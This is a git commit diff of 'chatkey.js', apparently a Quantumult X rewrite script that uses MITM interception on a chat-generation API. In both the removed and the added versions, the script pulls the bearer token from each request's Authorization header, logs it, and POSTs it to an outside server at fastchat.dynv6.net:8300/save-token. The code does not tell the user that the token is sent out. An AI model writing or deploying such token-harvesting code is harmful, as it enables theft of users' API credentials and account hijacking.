94df590adf7c73b20f1992f4f8ecf53a5c4a47e8
chiheye <42902754+chiheye@users.noreply.github.com>
2024-08-29 09:29:37 +0800

    Update chatkey.js

--- chatkey.js
+++ chatkey.js
@@ -1,33 +1,39 @@
 /******************************
 [rewrite_local]
-https://api-v4-generatechatstream-7hb5gcrmka-uc.a.run.app url script-request-header https://raw.githubusercontent.com/chiheye/qxjs/main/chatkey.js
+^https?:\/\/api-v4-generatechatstream-7hb5gcrmka-uc\.a\.run\.app url script-request-header https://raw.githubusercontent.com/chiheye/qxjs/main/chatkey.js
 [mitm] 
 hostname = api-v4-generatechatstream-7hb5gcrmka-uc.a.run.app
 ********************************/
-const url = 'https://api-v4-generatechatstream-7hb5gcrmka-uc.a.run.app/';
 
-if ($request && $request.url.match(url)) {
-    const authorizationHeader = $request.headers['authorization'];
-    const bearerToken = authorizationHeader.split(' ')[1];
+const targetURL = 'https://api-v4-generatechatstream-7hb5gcrmka-uc.a.run.app/';
 
-    if (bearerToken) {
-        console.log(`Bearer Token: ${bearerToken}`);
-        const saveTokenRequest = {
-            url: 'http://fastchat.dynv6.net:8300/save-token',
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({ token: bearerToken })
-        };
+if ($request && $request.url.includes(targetURL)) {
+    const authorizationHeader = $request.headers['authorization'] || $request.headers['Authorization'];
+    
+    if (authorizationHeader) {
+        const bearerToken = authorizationHeader.split(' ')[1];
+        
+        if (bearerToken) {
+            console.log(`Bearer Token: ${bearerToken}`);
+            const saveTokenRequest = {
+                url: 'http://fastchat.dynv6.net:8300/save-token',
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ token: bearerToken })
+            };
 
-        $task.fetch(saveTokenRequest).then(response => {
-            console.log('Token saved response: ' + response.body);
-        }, reason => {
-            console.log('Error saving token: ' + reason.error);
-        });
+            $task.fetch(saveTokenRequest).then(response => {
+                console.log('Token saved response: ' + response.body);
+            }).catch(error => {
+                console.log('Error saving token: ' + error);
+            });
+        } else {
+            console.log("Bearer token not found in authorization header.");
+        }
     } else {
-        console.log("Bearer token not found.");
+        console.log("Authorization header not found.");
     }
 }
 
